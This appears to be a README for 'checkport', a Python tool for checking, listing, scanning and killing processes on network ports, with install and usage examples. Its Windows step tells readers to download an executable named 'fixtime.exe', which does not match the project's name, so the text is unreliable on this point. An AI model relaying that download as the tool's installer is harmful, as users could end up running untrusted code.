
# checkport

[![GitHub release](https://img.shields.io/github/release/watcher1337/checkport.svg)](https://github.com/watcher1337/checkport/releases/latest)
[![Python 3.8+](https://img.shields.io/badge/python-3.8+-blue.svg)](https://www.python.org/)
[![Platform](https://img.shields.io/badge/platform-Windows%20%7C%20Linux%20%7C%20macOS-lightgrey.svg)](https://github.com/watcher1337/checkport/releases)

**Port management tool for checking and killing processes on specific ports.**

---

## 🚀 Quick Install

```bash
pipx install checkport
```
```bash
uv tool install checkport
```


### Windows

Download `fixtime.exe` from [releases](https://github.com/watcher1337/checkport/releases/latest)

---

## 📖 Usage

```bash
checkport -c 8080          # Check if port is in use
checkport -k 8080          # Kill process on port
checkport --list           # List all listening ports
checkport --scan 8000-8100 # Scan port range
checkport -h               # Show help
```

---

## 💡 Examples

```bash
# Check port 8080
checkport -c 8080

# Kill process on port 8080
checkport -k 8080

# Force kill
checkport -k 443 --force

# List all ports
checkport --list

# Scan range
checkport --scan 8000-8100
```

---




